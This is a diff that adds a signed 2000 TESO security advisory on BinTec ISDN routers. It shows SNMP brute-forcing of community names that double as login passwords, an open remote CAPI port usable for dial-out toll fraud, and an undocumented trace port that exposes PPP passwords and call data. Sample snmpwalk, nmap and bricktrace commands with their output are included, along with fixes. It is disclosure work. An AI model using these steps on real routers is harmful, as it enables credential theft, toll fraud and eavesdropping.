@@ -1,0 +1,405 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+- ------
+
+TESO Security Advisory
+2000/03/30
+
+BinTec router security and privacy weakness
+
+
+Summary
+===================
+
+    By using SNMP brute-force-techniques for SNMP community-names one is able
+    to gain the management accounts passwords, which are the same as the SNMP
+    community names.
+    Additionally the MIB-Tree holds security related information which should
+    not be accessible through read-only/SNMP. These routers also offer services
+    which can be abused rather easily, like dialing out and getting full line
+    access via a CAPI interface, or a debugging interface which gives you all
+    information which is sent over the BRI-lines.
+    (Those services are open as default and the debugging service is barely
+    documented)
+
+
+Systems Affected
+===================
+
+    BinTec ISDN router family
+
+    tested: BIANCA/BRICK-XL
+      	    BIANCA/BRICK-XS
+
+
+Tests
+===================
+
+
+    (1) Example system setup for examples given
+    ___________________________________________________________________________
+
+
+    admin Login Password/SNMP Community  bitkoenig
+    read  Login Password/SNMP Community  rince
+    write Login Password/SNMP Community  guenthi
+
+    defaults are: admin/bintec read/public and write/public
+
+
+    (2) Example of Read-Only SNMP output from a BinTec router
+    ___________________________________________________________________________
+
+
+    syslog:
+    bitch:~$ snmpwalk fefe.rookie.lan rince .1.3.6.1.4.1.272.4.1.12.1
+    [...]
+    enterprises.272.4.1.12.1.4.954440111.7.39 = "citykom-muenster:
+     local IP address is 195.202.40.124, remote is 195.202.32.121"
+    enterprises.272.4.1.12.1.4.954440116.7.40 =
+     "LOGOUT as admin from TELNET 192.168.0.100 at Thu Mar 30 18:15:16 2000"
+    enterprises.272.4.1.12.1.4.954440685.7.41 =
+     "LOGIN as admin from TELNET 192.168.0.100 at Thu Mar 30 18:24:45 2000"
+    enterprises.272.4.1.12.1.4.954440692.7.42 =
+     "citykom-muenster: outgoing connection closed, duration 583 sec, 18194
+      bytes received, 4934 bytes sent, 6 charging units, 0 charging amounts"
+    enterprises.272.4.1.12.1.4.954440692.7.43 =
+     "ISDN: 30.03.2000,18:15:08,18:24:52,583,18596,5306,134,124,6 Units,O,,
+      609910,7/0,0,0B,citykom-muenster"
+    [...]
+
+    capi-user-db:
+    bitch:~$ snmpwalk fefe.rookie.lan rince .1.3.6.1.4.1.272.4.7.8.1
+    enterprises.272.4.7.8.1.1.7.100.101.102.97.117.108.116.0 = "default"
+     /* username */
+    enterprises.272.4.7.8.1.2.7.100.101.102.97.117.108.116.0 = ""
+     /* password */
+    enterprises.272.4.7.8.1.6.7.100.101.102.97.117.108.116.0 = 1
+     /* capi access activated */
+
+
+    (3) Remote CAPI Server on a BinTec router
+    ___________________________________________________________________________
+
+ 
+    fefe:> ps -elf
+    [...]
+    S     0    26     1  28        0   Jan  1 ?        00:00 00:00 vcapid
+    [...]
+
+    Corresponding Port:
+    
+    bitch:~# nmap -sS -O -p 6000 poor.brick.de
+
+    Starting nmap V.3.01beta by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+    Interesting ports on poor.brick.de (xxx.xxx.xxx.xxx):
+    Port    State       Protocol  Service
+    6000    open        tcp        X11
+
+    TCP Sequence Prediction: Class=random positive increments
+                        Difficulty=1894 (Medium)
+
+    Remote operating system guess:
+    Bintec Brick XS SW Release 4.9.1 ISDN access router
+
+    Nmap run completed -- 1 IP address (1 host up) scanned in 8 seconds
+
+
+    (4) BrickTrace Server on a BinTec router:
+    ___________________________________________________________________________
+
+
+    fefe:> ps -elf
+    [...]
+    S     0    24     1  28        0   Jan  1 ?        00:04 00:01 traced
+    [...]
+
+    Corresponding Port:
+
+    bitch:~# nmap -sS -O -p 7000 poor.brick.de
+
+    Starting nmap V.3.01beta by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+    Interesting ports on poor.brick.de (xxx.xxx.xxx.xxx):
+    Port    State       Protocol  Service
+    6000    open        tcp        afs3-fileserver
+
+    TCP Sequence Prediction: Class=random positive increments
+                        Difficulty=1894 (Medium)
+
+    Remote operating system guess:
+    Bintec Brick XS SW Release 4.9.1 ISDN access router
+
+    Nmap run completed -- 1 IP address (1 host up) scanned in 6 seconds
+
+
+    (5) BrickTracing a password from an outgoing PPP connection
+    ___________________________________________________________________________
+
+
+    bitch:~$ bricktrace -h2pi 1 0 2
+    bricktrace: Connected to 192.168.0.1(7000)
+    Tracing: Channel 1 Unit 0 Slot 2          /* Tracing the B-Channel */
+    [...]
+    020721.320 X DATA[0025]
+          0000: ff 03 c0 23 01 01 00 15  08 73 68 6f 6c 74 77 69  ...#.....user
+          0010: 73 07 72 65 74 68 6f 6f  6f                       .password
+             PPP packet protocol 0xc023 (PAP)
+             ID 1 PAP Authenticate-Request Peer-ID user Password password
+        A=FF  UI
+    [...]
+
+
+    (6) Snooping an S0 Bus for telephone calls
+    ___________________________________________________________________________
+
+
+    bitch:~$ bricktrace -h3 0 0 2
+    bricktrace: Connected to 192.168.0.1(7000)
+    Tracing: Channel 0 Unit 0 Slot 2        /* Tracing the D-Channel */
+    [...]
+    021096.656 R DATA[0015]
+          0000: 02 b3 10 1a 08 01 81 0d  18 01 89 1e 02 82 88 ...............
+            PD=08 Dest CR=01  SETUP ACKNOWLEDGE
+                IE-Element  : Channel Identification :
+                              Interface implicitly identified
+                              Interface type S0
+                              Channelnumber is exclusive (accept only this)
+                              Identified Channel is not D-Channel
+                              Selected Channel : B1-Channel
+                IE-Element  : Progress Indicator reports
+                              In-band information now available
+    [...]
+    021105.366 R DATA[0008]
+          0000: 02 b3 12 2e 08 01 81 02                           ........
+            PD=08 Dest CR=01  CALL PROCEEDING
+    021108.076 R DATA[0012]
+          0000: 02 b3 14 2e 08 01 81 01  1e 02 82 88              ............
+            PD=08 Dest CR=01  ALERT
+                IE-Element  : Progress Indicator reports
+                              In-band information now available
+    [...]
+    021124.748 R DATA[0028]
+          0000: 02 b3 16 2e 08 01 81 07  29 05 00 03 1e 12 23 4c  ........).....#L
+          0010: 0b 21 83 31 33 30 31 31  32 31 31 32              .!.130112112
+            PD=08 Dest CR=01  CONNECT
+                IE-Element  : Date yy.mm.dd-hh:mm : 0.3.30-18:35:134597435
+                IE-Element  : Unknown IE-Element 0x4c in Codeset 0
+   [...]
+   021130.282 R DATA[0045]
+         0000: 02 b3 1a 32 08 01 81 4d  1c 16 91 a1 13 02 02 c4   ...2...M........
+         0010: 37 02 01 22 30 0a a1 05  30 03 02 01 00 82 01 01   7.."0...0.......
+         0020: 28 0b 30 20 45 69 6e 68  65 69 74 65 6e            (.0 Einheiten
+            PD=08 Dest CR=01  RELEASE
+                IE-Element  : Facility
+                              Service discriminator is supplement. application
+                              Component tag is invoke
+                                integer (0x2)
+                                50231
+                                integer (0x1)
+                                34
+                                sequence (0xa)
+                                {
+                                    GetNextRequest (0x5)
+                                    {
+                                        sequence (0x3)
+                                        {
+                                            integer (0x1)
+                                            0
+                                        }
+                                    }
+                                    GetResponse (0x1)
+
+                                }
+
+
+                IE-Element  : Display                : 0 Einheiten
+   [...]
+
+
+    (7) Checking line status from BinTec's httpd:
+    ___________________________________________________________________________
+
+ 
+    [...]
+    Hardware Interfaces
+ 
+    Slot 1 Ethernet o.k.
+    Slot 2 ISDN S2M o.k. used 13, available 17
+    - - X X X X X - X -
+    - - X - X - - X - -
+    X - - - X - - X - X
+    [...]
+   
+    now we know what to sniff:
+    sniffing an inbound ppp connection on line 4 slot 2:
+ 
+    bitch:~$ bricktrace -h2pit 4 0 2
+    bricktrace: Connected to aaa.bbb.ccc.ddd(7000)
+    Tracing: Channel 4 Unit 0 Slot 2
+    [...]
+    004419.999 X DATA[0045]
+          0000: 21 45 00 00 2c 39 07 40  00 3e 06 f5 cc c2 61 44 !E..,9.@.>....aD
+          0010: 0d c2 61 45 28 00 50 da  79 bc f8 a9 a7 02 2b c5 ..aE(.P.y.....+.
+          0020: 7a 60 12 44 70 3c                                z.Dp<
+              Compressed PPP packet protocol 0x21 (TCP/IP)
+         A=21  RNR  P/F=0 N(R)=2
+ 
+              IP-Packet from aaa.bbb.ccc.ddd to a.b.c.d  protocol 0x6
+              TCP-Message, sourceport 80 destinationport 55929
+                           sequence number 3170412967
+                           acknowledgement number 36423034
+                           offset 6 flags ACK SYN
+                           window 17520 checksum 0x3c9e urgent 0
+    [...] 
+    004420.640 R DATA[0609]
+          0000: 2d 70 0e b0 43 ff 47 45  54 20 68 74 74 70 3a 2f  -p..C.GET http:/
+          0010: 2f 63 68 61 74 33 2e 70  6c 61 79 67 72 6f 75 6e /chat3.playgroun
+          0020: 64 2e 64 65 2f 63                                 d.de/c
+              Compressed PPP packet protocol 0x2d (VJ Compressed TCP/IP)
+         A=2D  I    P/F=1 N(R)=3 N(S)=0
+                 0E B0 C  FF G  E  T     h  t  t  p  :  /  /  c  h  a  t  3
+                    .  p  l  a  y  g  r  o  u  n  d  .  d  e  /  c  h  a  t
+              IP-Packet from a to b protocol 0x2f
+    [...]
+   
+ 
+Impact
+===================
+
+
+    (1) SNMP communities / login passwords
+    ___________________________________________________________________________
+
+    By using standard brute-force methods, the SNMP community string, and
+    therefore the login's passwords can be obtained. A program doing this
+    is for example ADMsnmp, which has to be feeded by a wordlist. Bruteforcing
+    this way is quite effective, you get about 500-1000 words per minute.
+    (which of course depends on your and the routers connectivity) You can get
+    this program from [4]. Bruteforcing the passwords directly via telnet isn't
+    possible because the router slows down after approx. 6 tries.
+
+
+    (2) Using the CAPI facility
+    ___________________________________________________________________________
+ 
+    Nearly any router can remotely be used as 'ISDN-Line provider' -  you can
+    use the BRI-Lines of the router if they are not password protected.
+    While doing a short survey most machines we encountered were proven
+    to be vulnerable, so they didn't have any restrictions set. The CAPI
+    daemon listens on port 6000 as you can see in the 'Tests' section.
+    This feature can, for example be exploited by dialing expensive numbers
+    (0900 or 0190 [in DE] lines). You may also hide your real identity by
+    calling a 'call-by-call' ISP who gives you another IP you can deal with.
+    A (R)CAPI library for Un*x exists, which can be used for these attacks.
+    It is available via [5]. There is also a CAPI user interface for MS Windows,
+    which is called Brickware and can be obtained via [6].
+    Firmware before 5.1.x seems to be generally not passworded, we have not 
+    checked 5.1.x yet.
+
+
+    (3) Using BrickTrace for snooping BRI-Lines
+    ___________________________________________________________________________
+
+    You can gain information of the ISP or corporation running these routers
+    with open BrickTrace ports (Port 7000, default) with a program called
+    bricktrace, which is available via [7]. In the documentation this
+    port isn't even stated (!). See 'Solution' for how to turn off this port.
+    As you can see the whole data passing the line, so you also get the users
+    passwords and see what they do in the net (it is in a way like a dedicated
+    sniffer). Using this technique of sniffing you may also see private
+    information of corporations, not only restricting you to Internet
+    traffic but also on 'intranet' lines that use the same router, as well
+    as telephony networks (S0 bus).
+
+ 
+Explanation
+===================
+
+    BinTec Communications seems to rely on security by obscurity. Neither the
+    severity of these services, nor how to configure them are mentioned
+    properly in their documentation.
+    However, BinTec routers *can* be secured, it just seems not to be common
+    knowledge.
+    In addition to this, it seem to be quite useless to provide RCAPI
+    facilities on a router which is mainly used for dial-in purposes. If one
+    needs those abilities, encrypted management access would be appropriate.
+
+
+Solution
+===================
+
+    SNMP: disable (admin.biboAdmSnmpPort=0)
+                  (admin.biboAdmSnmpTrapPort=0)
+
+    RCAPI: disable or password protect
+                  (admin.biboAdmCapiTcpPort=0)
+
+    BrickTrace: disable
+                  (admin.biboAdmTraceTcpPort=0)
+
+    Just manage your Router through serial line, because if your connection
+    gets sniffed, these services can be reactivated.
+ 
+
+Acknowledgments
+================
+
+    The bug-discovery and the demonstration are due to Stephan Holtwisch [2]
+    This advisory has been written by Stephan 'rookie' Holtwisch and hendy.
+
+
+Contact Information
+===================
+
+    The TESO crew can be reached by mailing to teso@coredump.cx.
+    Our web page is at [1].
+
+
+References
+===================
+
+    [1] TESO
+        http://teso.scene.at/ or https://teso.scene.at/
+
+    [2] Stephan Holtwisch
+	sholtwis@muenster.de
+
+    [3] BinTec Communications
+	http://www.bintec.de
+
+    [4] ADMsnmp - bruteforce SNMP communities
+	ftp://adm.freelsd.net/pub/ADM/ADMsnmp.0.1.tgz
+
+    [5] libcapi for RCAPI (Unix)
+        ftp://ftp.bintec.de/pub/brick/libcapi/
+
+    [6] BrickWare (CAPI software for windows)
+	ftp://ftp.bintec.de/pub/brick/brickware/
+
+    [7] BrickTrace (BRI-Line snooping)
+	ftp://ftp.bintec.de/pub/brick/unixtool/
+
+
+Disclaimer
+===================
+
+    This advisory does not claim to be complete or to be usable for any
+    purpose. Especially information on the vulnerable systems may be
+    inaccurate or wrong. The supplied information is not to be used for
+    malicious purposes, but for educational purposes only.
+
+    This advisory is free for open distribution in unmodified form.
+    Articles that are based on information from this advisory should include
+    at least links [1] and [2].
+
+- ------
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.1 (GNU/Linux)
+Comment: For info see http://www.gnupg.org
+
+iD8DBQE45biacZZ+BjKdwjcRAlQaAJ9ozxk8JlFuEZSA0br4u+d3+CbfgACgjLHx
+fDJT2mFXDx4xRzzE7Da7pD8=
+=d2XM
+-----END PGP SIGNATURE-----
